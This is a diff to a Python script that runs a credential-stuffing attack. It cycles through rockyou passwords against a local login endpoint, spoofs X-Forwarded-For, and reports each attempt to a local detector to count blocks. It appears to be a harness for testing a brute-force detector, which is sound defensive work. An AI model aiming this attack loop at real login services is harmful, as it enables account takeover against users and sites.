@@ -1,54 +1,87 @@
 # scripts/stuffing.py
 
-import requests, random, itertools, time, csv
+import requests
+import random
+import itertools
+import time
+import argparse
+
 
 # load your creds list (rockyou or hardcoded)
 def load_creds(path, limit=None):
-    creds = []
+    passwords = []
     with open(path, newline="", encoding="latin-1") as f:
         for i, line in enumerate(f):
-            pwd = line.strip()
-            # Here we generate dummy usernames, or you could have a separate user list
-            user = f"user{random.randint(1,10000)}"
-            creds.append((user, pwd))
-            if limit and i+1 >= limit:
+            passwords.append(line.strip())
+            if limit and i + 1 >= limit:
                 break
-    return creds
+    return passwords
 
-creds = load_creds("scripts/data/rockyou.txt", limit=5000)
-pool  = itertools.cycle(creds)
+passwords = load_creds("scripts/data/rockyou.txt", limit=5000)
+pool = itertools.cycle(passwords)
 
-def attack(rate_per_sec=10):
-    """Hit the store's /login, then your detector's /score."""
-    for user, pwd in pool:
+
+def attack(rate_per_sec=10, attempts=50, use_jwt=False):
+    """Send repeated login attempts and report detection results."""
+    success = 0
+    blocked = 0
+    for _ in range(attempts):
+        pwd = next(pool)
         ip = "10.0.0.1"
+        user = "alice"
 
-        # 1️⃣ Send to Sock Shop login
-        login_resp = requests.post(
-            "http://localhost:8080/login",
-            json={"username": user, "password": pwd},
-            headers={"X-Forwarded-For": ip},
-            timeout=3
-        )
-        login_ok = (login_resp.status_code == 200)
-        print(f"LOGIN {login_resp.status_code} ← {ip}:{user}/{pwd[:3]}…")
+        if use_jwt:
+            login_resp = requests.post(
+                "http://localhost:8001/api/token",
+                data={"username": user, "password": pwd},
+                timeout=3,
+            )
+            token = login_resp.json().get("access_token") if login_resp.status_code == 200 else None
+            login_ok = login_resp.status_code == 200
+            if token:
+                requests.get(
+                    "http://localhost:8001/api/alerts",
+                    headers={"Authorization": f"Bearer {token}"},
+                    timeout=3,
+                )
+        else:
+            login_resp = requests.post(
+                "http://localhost:8080/login",
+                json={"username": user, "password": pwd},
+                headers={"X-Forwarded-For": ip},
+                timeout=3,
+            )
+            login_ok = login_resp.status_code == 200
 
-        # 2️⃣ Send to your detector side-car
         score_payload = {
-            "client_ip":  ip,
-            "auth_result": "success" if login_ok else "failure"
+            "client_ip": ip,
+            "auth_result": "success" if login_ok else "failure",
+            "with_jwt": use_jwt,
         }
+
         try:
             score_resp = requests.post(
                 "http://localhost:8001/score",
                 json=score_payload,
-                timeout=3
+                timeout=3,
             )
-            print(f"SCORE {score_resp.status_code} → {score_resp.json()}")
+            if score_resp.json().get("status") == "blocked":
+                blocked += 1
         except Exception as e:
             print("SCORE ERROR:", e)
 
-        time.sleep(1/rate_per_sec)
+        if login_ok:
+            success += 1
+
+        time.sleep(1 / rate_per_sec)
+
+    print(f"Attempts: {attempts}, successes: {success}, blocked: {blocked}")
+
 
 if __name__ == "__main__":
-    attack(rate_per_sec=5)
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--jwt", action="store_true", help="Use JWT login endpoint")
+    parser.add_argument("--rate", type=float, default=5, help="Attempts per second")
+    parser.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
+    args = parser.parse_args()
+    attack(rate_per_sec=args.rate, attempts=args.attempts, use_jwt=args.jwt)
